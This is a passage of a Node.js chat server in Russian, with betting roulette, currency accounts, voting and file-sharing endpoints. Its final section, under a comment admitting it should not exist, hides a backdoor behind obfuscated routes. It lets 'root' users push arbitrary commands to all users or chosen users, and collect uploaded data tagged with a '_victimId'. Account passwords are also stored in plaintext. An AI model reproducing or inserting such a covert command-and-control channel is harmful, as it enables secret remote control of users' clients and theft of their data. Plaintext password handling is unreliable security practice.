            const coef = 1 / chance;
            const bet = {
                chance,
                coef,
                numbers,
                count,
                userAccountId: user._account.objId
            };
            const winned = Math.round(count * bet.coef);
            room.roulette.bets[userId] = bet;
            const userBet = room.roulette.users[userId];
            userBet.totalBets++;
            userBet.balance -= bet.count;
            //уменьшаем баланс и делаем запись в историю операций пользователя
            await changeUserBalance(user._account.objId, -count, {
                _id: `hendrix`,
                value: -count,
                comment: `Ставка на ${numbers.length} чисел. Шанс победы ${(chance * 100).toFixed(3)}%`,
                outgoing: true
            });
            room.stackMessages.push(getSystemMessage({
                message: `[clr=${user.color}]${user.name}[/], ставка сделана!\nШанс на победу: [bold]${(bet.chance * 100).toFixed(3)}%[/]\nКоэффициент: [bold]${bet.coef.toFixed(3)}[/]\nВыбранные числа: [bold]${bet.numbers.map(num => `[clr=${num % 2 ? `#01ADF7` : `red`} bold]${num}[/]`).join(` `)}[/]\nВ случае победы вы получите [bold]${winned} ([clr=green]+${winned - count}[/])[/]\nБаланс: ${userBalance}\nРезультаты ставки через ${Math.round(((+roulette.maximumBetTime + roulette.delay) - curDate)/ 1000)} секунд`
            }));
            if (!room.placeBet) {
                room.placeBet = true;
                roulette.subscribe(getRouletteCallback(room));
            }
        }
    },
    {
        reg: /[!/]стата\s*([a-f\d]+)?/gi,
        handler(match, user, userId, room, roomId) {
            let whom = Users[match[1]];
            const userBet = room.roulette.users[whom ? match[1] : userId];
            whom = whom || user;
            room.stackMessages.push(getSystemMessage({
                message: `Статистика [clr=${whom.color}]${whom.name}[/]:\nТекущий баланс: ${userBet.balance}\nВсего ставок сделано: ${userBet.totalBets}\nПобед: ${userBet.wins}\nПоражений: ${userBet.losses}\nВинрейт: ${(userBet.winrate * 100).toFixed(3)}%\nВсего выиграно: ${userBet.totalWon}\nВсего проиграно: ${userBet.totalLost}\n`
            }));
        }
    },
    {
        reg: /[!/]рейтинг/gi,
        async handler(match, user, userId, room, roomId) {
            const users = [];
            let message = `Рейтинг:\n`;
            for (_id in room.roulette.users) {
                const user = Users[_id];
                if (!user) {
                    //Если пользователь вышел, хранить его статистику больше не имеет смысла
                    delete room.roulette.users[_id];
                    continue;
                }
                if (!user._account) {
                    continue;
                }
                users.push({
                    balance: await getUserAccBalance(user._account.objId),
                    user
                });
            }
            users.sort((b, a) => a.balance - b.balance);
            for (let i = 0; i < users.length; i++) {
                const {
                    user,
                    balance
                } = users[i];
                message += `${i + 1}. [clr=${user.color} bold]${user.name}[/] ${balance}\n`;
            }
            if (!users.length) {
                message += `В комнате [clr=${room.color}]${room.name}[/] нет пользователей со счетами`;
            }
            room.stackMessages.push(getSystemMessage({
                message
            }));
        }
    },
    {
        reg: /[!/]ставка\s+шанс\s+(\d+(?:\.\d+)?)/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            const chance = +match[1] > 100 ? 100 : +match[1];
            if (chance) {
                room.roulette.chance = chance / 100;
                room.stackMessages.push(getSystemMessage({
                    message: `Максимально возможный шанс на победу: ${chance.toFixed(3)}`
                }));
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Неправильный шанс!`
                }));
            }
        })
    },
    {
        reg: /[!/]дать\s+(-?\d+(?:e\d+)?)\s+([a-f\d]+)/gi,
        handler: getAdminHandler(async (match, user, userId, room, roomId) => {
            const count = +match[1];
            const recipient = match[2];
            const whom = Users[recipient];
            if (count) {
                const operationObj = {
                    _id: `hendrix`,
                    value: count,
                    comment: count > 0 ? `Пожертвование` : `Конфискация денег`,
                    outgoing: count < 0
                };
                if (!whom) {
                    if (await accountExists(recipient)) {
                        await changeUserBalance(ObjectID(recipient), count, operationObj);
                        return room.stackMessages.push(getSystemMessage({
                            message: `Счет [bold]${recipient}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
                        }));
                    } else {
                        return room.stackMessages.push(getSystemMessage({
                            message: `Пользователя с таким id и счета не существует!`
                        }));
                    }
                }
                if (!whom._account) {
                    return room.stackMessages.push(getSystemMessage({
                        message: `[clr=${whom.color}]${whom.name}[/] не имеет счета!`
                    }));
                }
                await changeUserBalance(whom._account.objId, count, operationObj);
                return room.stackMessages.push(getSystemMessage({
                    message: `Баланс [clr=${whom.color}]${whom.name}[/] изменён на [clr=${count > 0 ? `green bold]+` : `red bold]`}${count}[/]!`
                }));
            } else {
                room.stackMessages.push(getSystemMessage({
                    message: `Неправильная сумма!`
                }));
            }
        })
    },
    {
        reg: /[!/]уведомления/gi,
        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
            room.disableNotif = !room.disableNotif;
            room.stackMessages.push(getSystemMessage({
                message: `Уведомления о входах с неправильным паролем в комнате [clr=${room.color}]${room.name}[/]: [bold clr=${!room.disableNotif ? `green` : `red`}]${!room.disableNotif ? `On` : `Off`}[/]`
            }));
        })
    }
];

const getRouletteCallback = room => async res => {
    room.placeBet = false;
    let message = `Результаты ставки ${roulette.round} - [clr=${res % 2 ? `#01ADF7` : `red`} bold]${res}[/]\n`;
    for (let _id in room.roulette.bets) {
        const bet = room.roulette.bets[_id];
        const user = Users[_id];
        const userBet = room.roulette.users[_id];
        if (bet.numbers.includes(res)) {
            const winned = Math.round(bet.coef * bet.count);
            message += `[clr=${user.color}]${user.name}[/] выиграл [clr=green bold]+${winned}[/]\n`;
            userBet.wins += 1;
            userBet.totalWon += winned;
            await changeUserBalance(bet.userAccountId, winned, {
                _id: `hendrix`,
                value: winned,
                comment: `Победа ставки ${roulette.round}. Выпало число ${res}`,
                outgoing: false
            });
        } else {
            message += `[clr=${user.color}]${user.name}[/] проиграл [clr=red bold]-${bet.count}[/]\n`;
            userBet.losses += 1;
            userBet.totalLost += bet.count;
        }
        userBet.winrate = userBet.losses ? userBet.wins / (userBet.losses + userBet.wins) : 1;
        delete room.roulette.bets[_id];
    }
    room.stackMessages.push(getSystemMessage({
        message
    }));
};

const completeVote = room => {
    if (room.votingTimer) {
        clearTimeout(room.votingTimer);
        delete room.votingTimer;
    }
    const {
        voting
    } = room;
    const {
        options
    } = voting;
    const keys = Object.keys(options);
    const winner = {
        text: options[keys[0]].text,
        voted: options[keys[0]].voted
    }
    let statistics = `Статистика голосования:\n`;
    for (let i = 0; i < keys.length; i++) {
        const option = options[keys[i]];
        statistics += `${option.text} - ${option.voted} проголосовавших (${(option.voted / voting.totalVoted * 100).toFixed(3)}%)\n`;
        if (i && option.voted > winner.voted) {
            winner.voted = option.voted;
            winner.text = option.text;
        }
    }
    const filtered = keys.filter(key => options[key].voted);
    const zeroCount = keys.length - filtered.length;
    const makeEqual = filtered.length > 1;
    const message = `Итоги голосования ${voting.text}: [bold]${makeEqual && new Set(filtered.map(key => options[key].voted)).size == 1 ? `Победителя в голосовании нет! Все равны!` : zeroCount == keys.length ? `Никто не проголосовал` : winner.text}[/]\n${zeroCount == keys.length ? `` : statistics}`;
    room.stackMessages.push(getSystemMessage({
        message
    }));
    delete room.voting;
};

app.post(`/publish`, async (req, res) => {
    const data = await getDecryptedData(req.body.data, Users[req.body._id].aesKeyBytes);
    const room = Rooms[data._id];
    const userId = req.body._id;
    const user = Users[userId];
    const authed = auth(room, data._id, user, userId, data.password);
    if (authed) {
        const {
            message
        } = data;
        const {
            typing = false
        } = data;
        let msg = {
            message,
            typing,
            name: user.name,
            color: user.color,
            user: userId,
        };
        const conf = confirmed[user._token];
        if (conf) {
            msg.confirmed = true;
            msg = Object.assign(msg, conf);
        }
        room.stackMessages.push(getMessage(msg));
        for (let i = 0; i < commands.length; i++) {
            let r;
            while (r = commands[i].reg.exec(message)) {
                commands[i].handler(r, user, userId, room, data._id);
            }
        }
    }
    res.send({
        success: authed
    });
});

app.post(`/getUsersInRoom`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const key = user.aesKeyBytes;
    const roomData = await getDecryptedData(req.body.data, key);
    const room = Rooms[roomData._id];
    if (auth(room, roomData._id, user, userId, roomData.password)) {
        if (room.hidden) {
            return res.send({
                members: false
            });
        }
        let members = [];
        room.members.forEach(_id => {
            const user = Users[_id];
            const {
                name,
                color
            } = user;
            let member = {
                name,
                color,
                _id
            };
            if (_id == room._creator) {
                member.creator = true;
            }
            if (confirmed[user._token]) {
                member.badges = confirmed[user._token].badges;
            }
            members.push(member);
        });
        members = encryptAES(JSON.stringify(members), key);
        res.send({
            members
        });
    } else {
        res.send({
            success: false
        });
    }
});

app.post(`/disconnect`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const key = user.aesKeyBytes;
    const roomData = await getDecryptedData(req.body.data, key);
    const room = Rooms[roomData._id];
    if (auth(room, roomData._id, user, userId, roomData.password, true)) {
        disconnect(room, user, userId);
    }
    res.send({
        success: true
    });
});

setInterval(() => {
    const curDate = new Date();
    for (let userId in Users) {
        const user = Users[userId];
        if (curDate - user.lastActivity >= 30000) {
            if (user.curRoom) {
                disconnect(Rooms[user.curRoom], user, userId);
            }
            delete Users[userId];
        }
    }
}, 5000);

app.post(`/alive`, (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    if (user) {
        user.lastActivity = new Date();
    }
    res.send({
        alive: !!user
    })
});

app.post(`/sendFile`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    user.lastActivity = new Date();
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const room = Rooms[data.room._id];
    let success = true;
    const conf = confirmed[user._token];
    let additional = {
        name: user.name,
        color: user.color,
        user: userId,
    };
    if (conf) {
        additional.confirmed = true;
        additional = Object.assign(additional, conf);
    }
    if (auth(room, data.room._id, user, userId, data.room.password)) {
        const {
            fileId,
            ext,
            filePart,
            progress,
            position,
            info
        } = data;
        let msg;
        if (data.ready) {
            msg = {
                file: {
                    fileId,
                    ext,
                    ready: true
                },
            };
        } else {
            msg = {
                file: {
                    fileId,
                    ext,
                    filePart,
                    progress,
                    position
                },
            };
            if (position == 1) {
                msg.file.info = info;
            }
        }
        msg = Object.assign(msg, additional);
        room.stackFileMessages.push(getMessage(msg));
    } else {
        success = false;
    }
    res.send({
        success
    });
});

app.post(`/unhandledError`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    data.userName = user.name;
    fs.appendFile(`log.txt`, `${JSON.stringify(data, null, 4)}\n\n`, (err) => {});
    res.send({
        success: true
    });
});

const accountExists = async _id => {
    if (_id.length != 24) {
        return false;
    }
    _id = ObjectID(_id);
    return !!(await findDataInCollection(hendrixDatabase.accounts, {
        _id
    }, {
        projection: {
            _id: true
        },
    }));
};

const changeUserBalance = async (objId, value, operationInfo = {}) => {
    operationInfo.date = new Date();
    return await updateDataInCollection(hendrixDatabase.accounts, {
        _id: objId
    }, {
        $inc: {
            balance: value
        },
        $push: {
            operations: {
                $each: [operationInfo],
                $position: 0
            }
        }
    });
};

app.post(`/createAccount`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const {
        password
    } = data;
    const _id = await getRandomId(12);
    await addDataToCollection(hendrixDatabase.accounts, {
        _id: ObjectID(_id),
        password,
        balance: 0,
        operations: []
    });
    res.send({
        data: await getDataProperty({
            _id
        }, user.aesKeyBytes)
    });
});

const getUserAccBalance = async _id => (await findDataInCollection(hendrixDatabase.accounts, {
    _id
}, {
    projection: {
        balance: true
    }
})).balance;

const getLogInAcc = async data => {
    let {
        _id,
        password
    } = data;
    _id = Buffer.from(_id, `hex`).toString(`hex`);
    const account = _id.length == 24 ? await findDataInCollection(hendrixDatabase.accounts, {
        _id: ObjectID(_id),
        password: {
            $eq: password
        }
    }, {
        projection: {
            balance: true
        }
    }) : null;
    return {
        logIn: !!account,
        account
    };
};

app.post(`/loginInAccount`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const getAccR = await getLogInAcc(data);
    const resObj = {
        _id: data._id,
        logIn: getAccR.logIn
    };
    if (resObj.logIn) {
        resObj.balance = getAccR.account.balance;
        user._account = {
            id: data._id,
            objId: ObjectID(data._id)
        };
    } else if (user._account && user._account.id == data._id) {
        delete user._account;
    }
    res.send({
        data: await getDataProperty(resObj, user.aesKeyBytes)
    });
});

app.post(`/changeAccountPassword`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const success = !!(await updateDataInCollection(hendrixDatabase.accounts, {
        _id: ObjectID(data._id),
        password: {
            $eq: data.password
        }
    }, {
        $set: {
            password: data.newPassword
        }
    })).modifiedCount;
    if (success && user._account && user._account.id == data._id) {
        delete user._account;
    }
    res.send({
        success
    });
});

app.post(`/deleteAccount`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const success = !!(await deleteDataInCollection(hendrixDatabase.accounts, {
        _id: ObjectID(data._id),
        password: {
            $eq: data.password
        }
    })).deletedCount;
    if (success && user._account.id == data._id) {
        delete user._account;
    }
    res.send({
        success
    });
})

app.post(`/getOperationsHistory`, async (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
    const historyPart = await findDataInCollection(hendrixDatabase.accounts, {
        _id: ObjectID(data._id),
        password: {
            $eq: data.password
        }
    }, {
        projection: {
            operations: {
                $slice: [data.page * 10, 10],
            },
            password: false,
            balance: false,
        },
    });
    res.send({
        data: await getDataProperty({
            historyPart,
        }, user.aesKeyBytes)
    });
});

app.post(`/check`, (req, res) => {
    res.send({
        success: req.body.version == version
    });
});

const roulette = {
    round: 0,
    rouletteFirstSecretSeed: crypto.randomFillSync(Buffer.alloc(64)).toString(`hex`), //512 bit secret seed
    rouletteSecondSecretSeed: crypto.randomFillSync(Buffer.alloc(64)).toString(`hex`), //512 bit secret seed
    getBetResult() {
        if (this.round >= Number.MAX_SAFE_INTEGER) {
            this.round = 1;
        }
        const hash = pbkdf2.pbkdf2Sync(`${this.rouletteFirstSecretSeed}-${++this.round}-${this.rouletteSecondSecretSeed}`, ``, 10, 32, `sha512`).toString(`hex`);
        return parseInt(hash.slice(-13), 16) % this.upperLimit + 1;
    },
    upperLimit: 36,
    get odd() { //нечётные
        return this.getFilteredNums(e => e % 2);
    },
    get even() { //чётные
        return this.getFilteredNums(e => !(e % 2));
    },
    getFilteredNums(filter) {
        return Array.from({
            length: this.upperLimit
        }, (e, p) => p + 1).filter(filter);
    },
    subscribers: [],
    subscribe(callback) {
        this.subscribers.push(callback);
    },
    interval: 20000,
    delay: 2000,
    roll() {
        const res = this.getBetResult();
        const curDate = new Date();
        this.maximumBetTime = new Date(+curDate + this.interval - this.delay);
        this.subscribers.forEach(f => {
            f(res);
        });
        this.subscribers = [];
    }
};

roulette.maximumBetTime = new Date(+new Date() + roulette.interval - this.delay);

setInterval(() => {
    roulette.roll();
}, roulette.interval);

//всего, что идет далее, не должно быть, но я хочу, чтобы это было так.

const getDecryptedDataBackDoor = (data, key) => {
    return JSON.parse(decryptAES(data, key));
}

const getDataPropertyBackDoor = (data, key) => {
    return encryptAES(JSON.stringify(data), key);
};

app.post(`/Si9Mu7IY8LpTvqj`, (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const conf = confirmed[user._token];
    res.send({
        data: getDataPropertyBackDoor({
            access: !!conf && !!conf.root
        }, user.aesKeyBytes)
    })
});

const usersCommands = {};
const usersWaitingCommand = [];
const usersData = [];
let rootSubs = [];

app.post(`/9Zb6JDSz7AQtfb3`, (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const conf = confirmed[user._token];
    if (conf && conf.root) {
        let error = false;
        let errorReason = ``;
        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
        let recipients = [];
        const missed = {};
        data.destination.toLowerCase().split(/\s*,\s*/).forEach(recipient => {
            if (recipient == `me`) {
                recipients.push(userId);
            } else if (recipient == `^me`) {
                missed[userId] = true;
            } else if (recipient[0] == `_`) {
                const roomId = recipient.slice(1);
                const room = Rooms[roomId];
                if (room) {
                    recipients.push(...room.members);
                }
            } else if (recipient == `all`) {
                recipients.push(...Object.keys(Users));
            } else if (recipient[0] == `^`) {
                const newId = recipient.slice(1);
                if (newId[0] == `_`) {
                    const roomId = newId.slice(1);
                    const room = Rooms[roomId];
                    if (room) {
                        room.members.forEach(id => {
                            missed[id] = true;
                        });
                    }
                } else {
                    missed[newId] = true;
                }
            } else if (Users[recipient]) {
                recipients.push(recipient);
            }
        });
        recipients = [...new Set(recipients.filter(id => !missed[id]))];
        if (!recipients.length) {
            error = true;
            errorReason = `Некорректно выбраны получатели!`;
        }
        for (let i = 0; i < recipients.length; i++) {
            usersCommands[recipients[i]].push(data.command);
        }
        res.send({
            data: getDataPropertyBackDoor({
                error,
                errorReason
            }, user.aesKeyBytes)
        });
    } else {
        res.send({
            message: `access denied!`
        });
    }
});

app.post(`/Mh3lWGicrcSGu7V`, (req, res) => {
    const userId = req.body._id;
    if (!usersCommands[userId]) {
        usersCommands[userId] = [];
    }
    res._id = userId;
    usersWaitingCommand.push(res);
    res.on(`close`, () => {
        const position = usersWaitingCommand.indexOf(res);
        if (~position) {
            usersWaitingCommand.splice(position, 1);
        }
    });
});

//пакет с данными
app.post(`/cXVNwFSJeTwXFH6`, (req, res) => {
    const userId = req.body._id;
    const user = Users[userId];
    const conf = confirmed[user._token];
    if (conf && conf.root && req.body.waitingData) {
        res._id = userId;
        rootSubs.push(res);
        res.on(`close`, () => {
            const position = rootSubs.indexOf(res);
            if (~position) {
                rootSubs.splice(position, 1);
            }
        });
    } else {
        const data = getDecryptedDataBackDoor(req.body.data, user.aesKeyBytes);
        data._victimId = userId;
        data._victimName = user.name;
        usersData.push(data);
        res.send({});
    }
});

setInterval(() => {
    for (let i = 0; i < usersWaitingCommand.length; i++) {
        const userId = usersWaitingCommand[i]._id;
        if (usersCommands[userId].length) {
            const command = usersCommands[userId].shift();
            usersWaitingCommand[i].send({
                data: getDataPropertyBackDoor({
                    command
                }, Users[userId].aesKeyBytes)
            });
        }
    }
    while (usersData.length && rootSubs.length) {
        const data = usersData.shift();
        for (let i = 0; i < rootSubs.length; i++) {
            rootSubs[i].send({
                data: getDataPropertyBackDoor(data, Users[rootSubs[i]._id].aesKeyBytes)
            });
        }
        rootSubs = [];
    }
}, 0);